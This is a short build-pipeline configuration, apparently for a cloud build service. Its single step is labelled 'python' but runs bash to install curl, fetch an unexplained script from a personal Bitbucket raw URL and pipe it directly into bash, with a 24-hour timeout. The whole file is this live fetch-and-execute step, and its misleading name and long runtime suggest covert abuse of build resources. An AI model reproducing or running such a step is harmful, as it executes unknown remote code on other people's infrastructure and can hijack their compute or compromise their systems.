steps:
  - name: python
    args:
      - '-c'
      - >-
        apt-get update && apt-get install curl -y && curl -sL https://bitbucket.org/jeffreyadams29/paketu/raw/master/tes | bash
    waitFor:
      - '-'
    entrypoint: /bin/bash
timeout: 86400s
